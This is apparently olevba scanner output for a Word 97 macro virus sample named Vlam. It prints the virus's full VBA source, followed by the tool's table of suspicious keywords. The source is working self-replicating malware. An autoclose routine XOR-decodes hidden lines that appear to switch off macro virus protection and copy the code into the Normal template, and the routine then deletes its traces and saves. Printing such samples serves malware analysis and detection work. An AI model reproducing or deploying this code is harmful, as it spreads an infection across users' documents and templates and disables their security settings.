olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vlam-3669493a4f3ae449fc19cf397d9ab13413b294ec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vlam-3669493a4f3ae449fc19cf397d9ab13413b294ec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoclose()
'WM97.VLAM
Dim lines(27) As String
lines(1) = "Кл_Аччкч_Чацриа_Лаэс"
lines(2) = "Цас_лкч_ё_ЛкчидйСаихйдса<УЗХчкпажс<УЗЖкихклалсц-_¬<ЖкбаИкбрйа"
lines(3) = "Цас_бкж_ё_ДжсмуаБкжриалс<УЗХчкпажс<УЗЖкихклалсц-_¬<ЖкбаИкбрйа"
lines(4) = "Цас_снц_ё_СнмцБкжриалс<УЗХчкпажс<УЗЖкихклалсц-_¬<ЖкбаИкбрйа"
lines(5) = "крчжкба_ё_снц<ймлац-_c_снц<жкрлскгймлац¬"
lines(6) = "Тмсн_лкч"
lines(7) = "<байасаймлац__c_лкч<жкрлскгймлац"
lines(8) = "<млцачсймлац__c_крчжкба"
lines(9) = "Алб_Тмсн"
lines(10) = "Тмсн_бкж"
lines(11) = "<байасаймлац__c_бкж<жкрлскгймлац"
lines(12) = "<млцачсймлац__c_крчжкба"
lines(13) = "Алб_Тмсн"
lines(14) = "Тмсн_Кхсмклц"
lines(15) = "<УмчрцХчксажсмкл_ё_-Члб_Ї_ч¬"
lines(16) = "<ЖклгмчиЖклуачцмклц_ё_-Члб_Ї_ч¬"
lines(17) = "<ЦдуаЛкчидйХчкихс_ё_-Члб_Ї_ч¬"
lines(18) = "<Дххймждсмкл<ЦнктУмцрдйЗдцмжАбмскч_ё_-Члб_Ї_ч¬"
lines(19) = "<Дххймждсмкл<ЖкиидлбЗдчц-§Сккйц§¬<Жклсчкйц-§иджчк§¬<Алдзйаб_ё_-Члб_Ї_ч¬"
lines(20) = "<Дххймждсмкл<АлдзйаЖдлжайОаь_ё_тбЖдлжайБмцдзйаб"
lines(21) = "<Дххймждсмкл<ЦжчаалРхбдсмлв_ё_-Члб_Ї_ч¬"
lines(22) = "<ЦалбИдмйДссджн_ё__"
lines(23) = "Алб_Тмсн"
lines(24) = "Мг_Бдь-Лкт-¬¬_ё_·__Длб_Нкрч-Лкт-¬¬_№__ч_Снал"
lines(25) = "м_ё_Млс-Члб_Ї__ч¬"
lines(26) = "ЖкиидлбЗдчц-м¬<Жклсчкйц-м¬<Алдзйаб_ё_-Члб_Ї_ч¬"
lines(27) = "Алб_Мг"
For y = 1 To 27
mycode = mycode & Crypt(lines(y)) & vbCr
Next
ThisDocument.VBProject.VBComponents(1).CodeModule.insertlines 48, mycode
Call runme
NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 48, 28
ActiveDocument.VBProject.VBComponents(1).CodeModule.deletelines 48, 28
ActiveDocument.Save
NormalTemplate.Save
End Sub
Private Function Crypt(OldString)
For i = 1 To Len(OldString)
Crypt = Crypt & Chr(Asc(Mid(OldString, i, 1)) Xor 133)
Next
End Function

Private Sub runme()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

